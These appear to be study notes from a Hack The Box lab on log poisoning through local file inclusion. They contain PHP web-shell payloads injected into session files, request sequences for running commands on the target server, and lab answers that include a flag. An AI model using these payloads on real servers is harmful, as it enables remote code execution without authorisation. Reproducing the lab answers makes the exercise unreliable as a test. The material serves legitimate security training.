# Log Poisoning
Writing PHP code in a field we control that gets logged into a log file (i.e. `poison`/`contaminate` the log file), and then include that log file to execute the PHP code. 

As was the case in the previous section, any of the following functions with `Execute` privileges should be vulnerable to these attacks:
<table class="bg-neutral-800 text-primary w-full"><thead class="text-left rounded-t-lg"><tr class="border-t-neutral-600 first:border-t-0 border-t"><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4"><strong class="font-bold">Function</strong></th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4" align="center"><strong class="font-bold">Read Content</strong></th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4" align="center"><strong class="font-bold">Execute</strong></th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4" align="center"><strong class="font-bold">Remote URL</strong></th></tr></thead><tbody class="font-mono text-sm"><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><strong class="font-bold">PHP</strong></td><td class="p-4" align="center"></td><td class="p-4" align="center"></td><td class="p-4" align="center"></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">include()</code>/<code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">include_once()</code></td><td class="p-4" align="center">✅</td><td class="p-4" align="center">✅</td><td class="p-4" align="center">✅</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">require()</code>/<code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">require_once()</code></td><td class="p-4" align="center">✅</td><td class="p-4" align="center">✅</td><td class="p-4" align="center">❌</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><strong class="font-bold">NodeJS</strong></td><td class="p-4" align="center"></td><td class="p-4" align="center"></td><td class="p-4" align="center"></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">res.render()</code></td><td class="p-4" align="center">✅</td><td class="p-4" align="center">✅</td><td class="p-4" align="center">❌</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><strong class="font-bold">Java</strong></td><td class="p-4" align="center"></td><td class="p-4" align="center"></td><td class="p-4" align="center"></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">import</code></td><td class="p-4" align="center">✅</td><td class="p-4" align="center">✅</td><td class="p-4" align="center">✅</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><strong class="font-bold">.NET</strong></td><td class="p-4" align="center"></td><td class="p-4" align="center"></td><td class="p-4" align="center"></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">include</code></td><td class="p-4" align="center">✅</td><td class="p-4" align="center">✅</td><td class="p-4" align="center">✅</td></tr></tbody></table>

## PHP Session Poisoning
Most PHP web applications utilize `PHPSESSID` cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These details are stored in session files on the back-end, and saved in `/var/lib/php/sessions/` on Linux and in `C:\Windows\Temp\` on Windows. The name of the file that contains our user's data matches the name of our `PHPSESSID` cookie with the `sess_` prefix. For example, if the `PHPSESSID` cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3`, then its location on disk would be `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.

PHPSESSID cookie value is serialized data, try to look into that data and find out if we can modify any value. If yes, combined with a LFI we might trigger a RCE. For example, if the language value is reflected inside the cookie serialized data, we could trigger it like this:

```
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```
```
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

## Server Log Poisoning
Both Apache and Nginx maintain various log files, such as `access.log` and `error.log`. The `access.log` file contains various information about all requests made to the server, including each request's `User-Agent` header. As we can control the `User-Agent` header in our requests, we can use it to poison the server logs as we did above.

By default, Apache logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows, while Nginx logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows.

Finally, there are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over. The following are some of the service logs we may be able to read:

- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`

## Questions
1. Use any of the techniques covered in this section to gain RCE, then submit the output of the following command: pwd **Answer: /var/www/html**
   - Send these requests in order to find and read the flag using the PHP session poisoning method:
        ```
        GET /index.php?language=<%3fphp+system($_GET["cmd"])%3b%3f> HTTP/1.1
        ```
        ```
        GET /index.php?language=/var/lib/php/sessions/sess_iehte7il28nm957uqdcja48gr2&cmd=pwd HTTP/1.1
        ```
2. Try to use a different technique to gain RCE and read the flag at / **Answer: HTB{1095_5#0u1d_n3v3r_63_3xp053d}**
   - Send these requests in order to find and read the flag using the PHP session poisoning method:
        ```
        GET /index.php?language=<%3fphp+system($_GET["cmd"])%3b%3f> HTTP/1.1
        ```
        ```
        GET /index.php?language=/var/lib/php/sessions/sess_iehte7il28nm957uqdcja48gr2&cmd=ls+/ HTTP/1.1
        ```
        ```
        GET /index.php?language=<%3fphp+system($_GET["cmd"])%3b%3f> HTTP/1.1
        ```
        ```
        GET /index.php?language=/var/lib/php/sessions/sess_iehte7il28nm957uqdcja48gr2&cmd=cat+/c85ee5082f4c723ace6c0796e3a3db09.txt
        ```